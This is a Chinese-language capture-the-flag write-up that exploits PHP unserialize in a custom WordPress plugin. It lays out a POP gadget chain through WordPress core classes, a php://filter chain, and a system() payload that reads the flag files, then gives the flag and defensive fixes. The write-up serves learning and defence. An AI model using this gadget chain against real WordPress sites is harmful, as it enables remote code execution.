# Fancy Web

## 题目简述

题目是 WordPress 加自定义 `Fancy` 插件。前端接收 Base64 后的 PHP 序列化数据：

```php
$raw = base64_decode($_POST['serialized_data'], true);
$obj = @unserialize($raw);
if ($obj instanceof SecureTableGenerator) {
    echo $obj->generateTable();
}
```

`SecureTableGenerator::__wakeup()` 看似包含大量校验和清洗，但它会遍历可控的私有属性 `allowedTags`，并以非严格 `in_array` 检查每个元素。攻击者可以放入 WordPress 核心对象，借字符串转换触发一条已加载类的 POP gadget chain。

## 解题过程

### 1. 保持顶层类型合法

服务端要求反序列化结果是 `SecureTableGenerator`，因此不能直接提交任意 WordPress gadget。官方 `solve.php` 定义与目标同名、同私有字段布局的类，把 gadget 根对象放进：

```php
$this->allowedTags = [$WP_HTML_Tag_Processor];
```

PHP 序列化会为私有属性自动生成包含 NUL 的限定名称。由 PHP 本身生成序列化串，可以避免手工计算属性名长度和 NUL 编码。

### 2. 在 `__wakeup` 中触发字符串转换

唤醒流程最终进入 `resetSecurityProperties()`：

```php
foreach ($this->allowedTags as $tag) {
    if (in_array($tag, $safeTags)) {
        ...
    }
}
```

`in_array` 未启用严格模式。把 `$tag` 设为 `WP_HTML_Tag_Processor` 后，比较过程中触发其 `__toString()`。官方注释记录的核心调用链为：

```text
WP_HTML_Tag_Processor->__toString
→ get_updated_html
→ class_name_updates_to_attributes_updates
→ WP_Block_List->offsetGet
→ WP_Block_Patterns_Registry->get_registered
→ WP_Block_Patterns_Registry->get_content
```

### 3. 控制 pattern 的 `filePath`

构造对象关系：

```text
WP_HTML_Tag_Processor.attributes
  → WP_Block_List.registry
      → WP_Block_Patterns_Registry.registered_patterns["test"]
          → filePath = attacker controlled wrapper
```

`get_content()` 会按 `filePath` 加载 pattern 内容。官方解法把它设为 PHP filter chain：

```text
php://filter/<一系列 iconv/base64 过滤器>/resource=php://temp
```

过滤器链从空的 `php://temp` 构造出指定 PHP 源码，无需猜测服务器上可控文件名。最终加载的代码为：

```php
<?php
system(
  'cat /flag* > /var/www/html/wp-content/uploads/this_is_secret_folder_dont_touch_it'
);
?>
```

### 4. 获取 flag

流程为：

1. 用过滤器生成脚本把目标 PHP 转成 `php://filter` 链；
2. 用 `solve.php` 把该链放入 WordPress gadget，并序列化顶层 `SecureTableGenerator`；
3. Base64 后 POST 到首页；
4. 访问公开 uploads 路径读取落盘结果。

自定义类的清洗只处理表格字段，触发 POP chain 的副作用发生在清洗完成前，因此最终表格是否正常显示并不重要。

仓库正式挑战目录中的 flag 为：

```text
SEKAI{wordpress_new_gadget}
```

## 方法总结

反序列化后再检查 `instanceof` 无法阻止对象注入，因为合法顶层对象的内部属性仍能包含任意已加载对象。冗长的“安全清洗”还扩大了魔术方法触发面。

修复应从入口开始：

```php
unserialize($data, ["allowed_classes" => false]);
```

更好的做法是完全改用 JSON，并按 schema 重建纯数组。业务校验应使用严格比较 `in_array(..., true)`，且绝不能对不可信对象隐式执行字符串转换。
